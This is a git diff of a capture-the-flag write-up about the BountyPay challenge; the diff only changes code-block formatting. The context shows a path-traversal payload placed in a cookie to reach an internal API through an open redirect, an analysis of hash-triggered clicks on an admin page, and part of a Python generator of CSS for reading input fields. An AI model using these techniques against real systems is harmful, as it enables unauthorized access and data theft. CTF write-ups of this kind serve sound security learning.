@@ -41,7 +41,7 @@ This downloaded a git config file with the following contents:
 Look at that, a git repo :) 
 
 Navigating to this repo shows us a single file called logger.php, with the following contents:
-{% highlight php %}
+```php
 <?php
 
 $data = array(
@@ -55,7 +55,7 @@ $data = array(
 );
 
 file_put_contents('bp_web_trace.log', date("U").':'.base64_encode(json_encode($data))."\n",FILE_APPEND   );
-{% endhighlight %}
+```
 
 As we can see it logs HTTP requests to a file called 'bp_web_trace.log', so let's see if we can find that on the server.
 We can!
@@ -90,9 +90,9 @@ To my surprise, it did. This displayed us with some more information on Brian, n
 At this point i spent quite a while trying random things like bruteforcing paths via editing the cookie,  without any interesting results.
 Then i remembered the redirect to a google search we saw from earlier, both the internal request and the redirect were hitting api.bountypay.h1ctf.com
 So i edited to cookie's account_id to traverse back to the root of the api request and appended "redirect?url=https://www.google.com/search?q=REST+API" like so 
-{% highlight javascript %}
+```javascript
 {"account_id":"F8gHiqSdpK/../../../../../redirect?url=https://www.google.com/search?q=REST+API","hash":"de235bffd23df6995ad4e0930baac1a2"}
-{% endhighlight %}
+```
 Response: 200 OK
 Interesting.
 I tried replacing google.com with a random website to see if there was an open redirect present.
@@ -218,16 +218,16 @@ $(".tab").click(function () {
 })
 ```
 Some UI stuff.
-{% highlight javascript %}
+```javascript
 $(".sendReport").click(function () {
     $.get("/admin/report?url=" + url, function () {
         alert("Report sent to admin team")
     })
-{% endhighlight %}
+```
 sending the report I mentioned earlier.
-{% highlight javascript %}
+```javascript
 document.location.hash.length > 0 && ("#tab1" === document.location.hash && $(".tab1").trigger("click"), "#tab2" === document.location.hash && $(".tab2").trigger("click"), "#tab3" === document.location.hash && $(".tab3").trigger("click"), "#tab4" === document.location.hash && $(".tab4").trigger("click"));
-{% endhighlight %}
+```
 This check if a url fragment is present and then calls the "click" event on elements with the class of tab1-4. Hmm.
 
 If we can somehow control the "class" attribute of an element,  we can then "click" on that element by appending #tab1-4 to the end of the URL.
@@ -286,7 +286,7 @@ It found that there are 7 input fields with names code_1 - code_7.
 
 This was the code i ended up with
 
-{% highlight python %}
+```python
 
 import sys
 
@@ -338,7 +338,7 @@ for letter in keyspace:
     print(css6 % (letter,letter))
     print(css7 % (letter,letter))
 
-{% endhighlight %}
+```
 
 -----------------------
 
